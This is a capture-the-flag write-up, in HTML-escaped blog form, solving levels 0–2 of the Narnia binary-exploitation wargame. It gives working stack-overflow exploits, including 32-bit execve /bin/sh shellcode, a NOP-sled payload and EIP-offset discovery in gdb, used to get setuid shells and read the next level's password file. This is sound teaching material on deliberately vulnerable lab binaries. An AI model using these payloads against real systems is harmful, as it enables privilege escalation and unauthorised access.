binary exploit centered wargame, so fire up your debuggers and let&amp;rsquo;s smash those
stacks. For levels 5, 6, 7, and 8, see &lt;a href=&#34;http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/&#34;&gt;part 2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;All levels are in &lt;code&gt;/narnia&lt;/code&gt; and both the binary and the source are provided.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve not included the passwords here, so you&amp;rsquo;ll have to work through
the exercises yourself (or find them elsewhere :))&lt;/p&gt;

&lt;h2 id=&#34;level-00:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 00&lt;/h2&gt;

&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;val&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0x41414141&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Here is your chance: &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;scanf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%24s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;buf);&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;buf: %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,buf);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;val: 0x%08x&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,val);&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(val&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;WAY OFF!!!!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;Lines 8 and 9 tell us what we need to do. So knowing how variable allocation
on the stack works, we can exploit the setup on lines 5 and 6. &lt;code&gt;buf&lt;/code&gt; is a
fixed size and is allocated &lt;em&gt;after&lt;/em&gt; &lt;code&gt;val&lt;/code&gt;. Therefore it sits above &lt;code&gt;val&lt;/code&gt; on
the stack. As there is no &lt;a href=&#34;https://en.wikipedia.org/wiki/Address_space_layout_randomization&#34;&gt;ASLR&lt;/a&gt;
we should be able to write over the end of &lt;code&gt;buf&lt;/code&gt; and overwrite what is in memory
at &lt;code&gt;val&lt;/code&gt;&amp;rsquo;s location.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s try it&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*50&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0 
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCCCCC
val: 0x43434343
WAY OFF!!!!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Right, we can confirm that we are able to change the value of &lt;code&gt;val&lt;/code&gt;. Let&amp;rsquo;s
tread a bit more carefully and try to see if we can do it more accurately&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*20 + &amp;#39;BBBB&amp;#39;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0 
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCBBBB
val: 0x42424242
WAY OFF!!!!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So there is no space between &lt;code&gt;val&lt;/code&gt; and &lt;code&gt;buf&lt;/code&gt;, therefore 20 characters plus a
further 4 is enough to change val. Let&amp;rsquo;s write in the correct value, reversed of
course because of the endian notation&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*20 + &amp;#39;\xef\xbe\xad\xde&amp;#39;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
narnia0@melinda:/narnia$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We did it&amp;hellip;. but wait, where&amp;rsquo;s the shell? It&amp;rsquo;s closed, that&amp;rsquo;s where it is. We
need to keep it open. The trick is to append the &lt;code&gt;cat&lt;/code&gt; command to the input&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*20 + &amp;#39;\xef\xbe\xad\xde&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; cat&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
whoami
narnia1
cat /etc/narnia_pass/narnia1
[password]
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id=&#34;level-01:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 01&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ret)();&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(getenv(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;EGG&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL){&lt;/span&gt;    
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Give me something to execute at the env-variable EGG&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Trying to execute EGG!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;ret&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getenv(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;EGG&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;ret();&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;So here we need to set an environment variable named &lt;code&gt;EGG&lt;/code&gt; to something
we want executed. We can&amp;rsquo;t just pass &lt;code&gt;/bin/bash&lt;/code&gt; as it&amp;rsquo;s going to call whatever
we give it as a function. Ideally we want a shell, so what we need in this case
is the shellcode to do just that.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia1@melinda:/narnia$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;export EGG&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;print &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&amp;quot;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-02:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 02&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[]){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Usage: %s argument&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(buf,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf);&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;The biggest clues here are lines 6 and 12. Copying user supplied data
into a fixed sized array without any bound checking is always asking for
trouble. &lt;code&gt;narnia2&lt;/code&gt; binary also runs as setuid narnia3, which leads us to believe
we will be able to control the stack and get it to execute a payload of our
choosing. Of course this will be a shellcode to drop us into a shell.&lt;/p&gt;

&lt;p&gt;First we need to work out how much data is needed to overwrite &lt;code&gt;EIP&lt;/code&gt;. We can
do this by trial and error, or we can use a pattern generator. I am going to
use my &lt;a href=&#34;https://github.com/Svenito/exploit-pattern&#34;&gt;pattern generator&lt;/a&gt; instead
of metasploit&amp;rsquo;s one. I&amp;rsquo;ll create a payload big enugh to overflow the
buffer and then check the value of &lt;code&gt;EIP&lt;/code&gt;. Pasting that back into the pattern
generator will tell us at what location in the pattern the string occurs.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia2@melinda:/narnia$ gdb -q narnia2
Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Starting program: /games/narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
(gdb) info reg
eax            0x0	0
ecx            0x0	0
edx            0xf7fcb898	-134432616
ebx            0xf7fca000	-134438912
esp            0xffffd640	0xffffd640
ebp            0x65413565	0x65413565
esi            0x0	0
edi            0x0	0
eip            0x37654136	0x37654136
eflags         0x10282	[ SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 0x37654136
Pattern 0x37654136 first occurrence at position 140 in pattern.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;We can control &lt;code&gt;EIP&lt;/code&gt; with whatever we put at position 140 of our payload. But
what do we put there? Well for that we need to figure out where the rest of our
data is going. Using a known payload let&amp;rsquo;s see where our input ends up:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) run $(python -c &amp;quot;print &amp;#39;a&amp;#39; * 140 + &amp;#39;b&amp;#39; * 4&amp;quot;)
Starting program: /games/narnia/narnia2 $(python -c &amp;quot;print &amp;#39;a&amp;#39; * 140 + &amp;#39;b&amp;#39; * 4&amp;quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
(gdb) x/200x $esp
0xffffd650:	0x00000000	0xffffd6e4	0xffffd6f0	0xf7feacea
0xffffd660:	0x00000002	0xffffd6e4	0xffffd684	0x08049768
0xffffd670:	0x0804821c	0xf7fca000	0x00000000	0x00000000
0xffffd680:	0x00000000	0xed18585e	0xd520bc4e	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000002	0x08048360
0xffffd6a0:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd6b0:	0x00000002	0x08048360	0x00000000	0x08048381
0xffffd6c0:	0x0804845d	0x00000002	0xffffd6e4	0x080484d0
0xffffd6d0:	0x08048540	0xf7feb180	0xffffd6dc	0x0000001c
0xffffd6e0:	0x00000002	0xffffd812	0xffffd828	0x00000000
0xffffd6f0:	0xffffd8b9	0xffffd8cd	0xffffd8dd	0xffffd8f0
0xffffd700:	0xffffd913	0xffffd927	0xffffd930	0xffffd93d
0xffffd710:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3
0xffffd720:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
0xffffd730:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
0xffffd740:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd750:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000
0xffffd760:	0x00000010	0x1f898b75	0x00000006	0x00001000
0xffffd770:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd780:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd790:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd7a0:	0x00000009	0x08048360	0x0000000b	0x000036b2
0xffffd7b0:	0x0000000c	0x000036b2	0x0000000d	0x000036b2
0xffffd7c0:	0x0000000e	0x000036b2	0x00000017	0x00000000
0xffffd7d0:	0x00000019	0xffffd7fb	0x0000001f	0xffffdfe2
0xffffd7e0:	0x0000000f	0xffffd80b	0x00000000	0x00000000
0xffffd7f0:	0x00000000	0x00000000	0xe8000000	0x7c03ba19
0xffffd800:	0x2bd0895a	0x3866226d	0x69ad5957	0x00363836
0xffffd810:	0x672f0000	0x73656d61	0x72616e2f	0x2f61696e
0xffffd820:	0x6e72616e	0x00326169	0x61616161	0x61616161
0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8b0:	0x61616161	0x62626262	0x47445800	0x5345535f
0xffffd8c0:	0x4e4f4953	0x3d44495f	0x30333035	0x45485300
0xffffd8d0:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
0xffffd8e0:	0x78723d4d	0x322d7476	0x6f633635	0x00726f6c
0xffffd8f0:	0x5f485353	0x45494c43	0x323d544e	0x322e3231
0xffffd900:	0x37352e33	0x3136312e	0x35333320	0x34203932
0xffffd910:	0x53003334	0x545f4853	0x2f3d5954	0x2f766564
0xffffd920:	0x2f737470	0x4c003033	0x4c415f43	0x00433d4c
0xffffd930:	0x52455355	0x72616e3d	0x3261696e	0x5f534c00
0xffffd940:	0x4f4c4f43	0x723d5352	0x3a303d73	0x303d6964
0xffffd950:	0x34333b31	0x3d6e6c3a	0x333b3130	0x686d3a36
0xffffd960:	0x3a30303d	0x343d6970	0x33333b30	0x3d6f733a
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;We see our payload start at &lt;code&gt;0xffffd828&lt;/code&gt; with the last 4 bytes at &lt;code&gt;0xffffd8b4&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The buffer gives us 128 bytes to play with. Our shellcode is 25 bytes, so we&amp;rsquo;ll pad the
start with a &lt;a href=&#34;https://en.wikipedia.org/wiki/NOP_slide&#34;&gt;nop sled&lt;/a&gt; to adjust for
the memory offset introduced by &lt;code&gt;gdb&lt;/code&gt;. Then set the &lt;code&gt;EIP&lt;/code&gt; to somewhere in the middle
of the sled&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia2@melinda:/narnia$ ./narnia2 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\x90&amp;#39;*115 + &amp;#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&amp;#39; + &amp;#39;\x60\xd8\xff\xff&amp;#39;&amp;quot;`&lt;/span&gt;
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
[password]
&lt;/pre&gt;&lt;/div&gt;
